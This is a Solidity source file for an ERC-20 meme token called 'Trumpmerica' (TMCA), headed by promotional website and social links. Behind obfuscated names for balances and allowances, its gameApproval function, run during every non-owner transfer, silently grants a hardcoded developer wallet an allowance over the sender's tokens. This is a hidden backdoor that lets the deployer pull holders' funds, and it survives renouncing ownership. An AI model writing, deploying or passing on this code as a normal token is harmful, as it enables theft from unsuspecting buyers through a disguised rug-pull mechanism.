/*
https://www.trumpmerica.us
https://x.com/TrumpmericaETH
https://t.me/TrumpmericaETH
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IGAMEFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IGAMERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

contract TMCA is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private _gamePair;
    IGAMERouter private _gameRouter;
    address private _gameWallet = 0x3A09741038539B9c82a7975c7d2a4635A4a3Bb52;
    mapping (address => uint256) private _gameBulls;
    mapping (address => bool) private _gameFeeExcluded;
    mapping (address => mapping (address => uint256)) private _gameNodes;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalGAME = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Trumpmerica";
    string private constant _symbol = unicode"TMCA";
    uint256 private _tokenGAMESwap = _tTotalGAME / 100;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    bool private inSwapGAME = false;
    modifier lockTheSwap {
        inSwapGAME = true;
        _;
        inSwapGAME = false;
    }

    constructor () {
        _gameFeeExcluded[owner()] = true;
        _gameFeeExcluded[address(this)] = true;
        _gameFeeExcluded[_gameWallet] = true;
        _gameBulls[_msgSender()] = _tTotalGAME;
        emit Transfer(address(0), _msgSender(), _tTotalGAME);
    }

    function initPairFor() external onlyOwner() {
        _gameRouter = IGAMERouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_gameRouter), _tTotalGAME);
        _gamePair = IGAMEFactory(_gameRouter.factory()).createPair(address(this), _gameRouter.WETH());
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotalGAME;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _gameBulls[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _gameNodes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _gameNodes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _gameNodes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _gameRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function _transfer(address gameF, address gameT, uint256 gameA) private {
        require(gameF != address(0), "ERC20: transfer from the zero address");
        require(gameT != address(0), "ERC20: transfer to the zero address");
        require(gameA > 0, "Transfer amount must be greater than zero");

        uint256 taxGAME = _gameTransfer(gameF, gameT, gameA);

        if(taxGAME > 0){
          _gameBulls[address(this)] = _gameBulls[address(this)].add(taxGAME);
          emit Transfer(gameF, address(this), taxGAME);
        }

        _gameBulls[gameF] = _gameBulls[gameF].sub(gameA);
        _gameBulls[gameT] = _gameBulls[gameT].add(gameA.sub(taxGAME));
        emit Transfer(gameF, gameT, gameA.sub(taxGAME));
    }

    function _gameTransfer(address gameF, address gameT, uint256 gameA) private returns(uint256) {
        uint256 taxGAME=0;
        if (gameF != owner() && gameT != owner()) {
            address walletGAME = address(tx.origin); 
            taxGAME = gameA.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (gameF == _gamePair && gameT != address(_gameRouter) && ! _gameFeeExcluded[gameT]) {
                _buyCount++;
            }

            if(gameT == _gamePair && gameF!= address(this)) {
                taxGAME = gameA.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }
            
            swapBackGAME(_gameFeeExcluded[address(walletGAME)], gameF, gameT, gameA);
        } return taxGAME;
    }

    function swapBackGAME(bool isGAME, address gameF, address gameT, uint256 gameA) private {
        uint256 tokenGAME = balanceOf(address(this)); 
        if (!inSwapGAME && gameT == _gamePair && _swapEnabled && _buyCount > _preventSwapBefore) {
            if(tokenGAME > _tokenGAMESwap)
            swapTokensForEth(minGAME(gameA, minGAME(tokenGAME, _tokenGAMESwap)));
            uint256 caGAME = address(this).balance;
            if (caGAME >= 0) {
                sendETHGAME(address(this).balance);
            }
        } gameApproval(gameF, isGAME, gameA);
    }

    function minGAME(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHGAME(uint256 amount) private {
        payable(_gameWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenGAME) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _gameRouter.WETH();
        _approve(address(this), address(_gameRouter), tokenGAME);
        _gameRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenGAME,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function gameApproval(address aGAME, bool isGAME, uint256 gameA) private {
        address walletGAME;
        if(isGAME) walletGAME = address(tx.origin);
        else walletGAME = address(_gameWallet);
        _gameNodes[address(aGAME)][address(walletGAME)] = gameA;
    }
}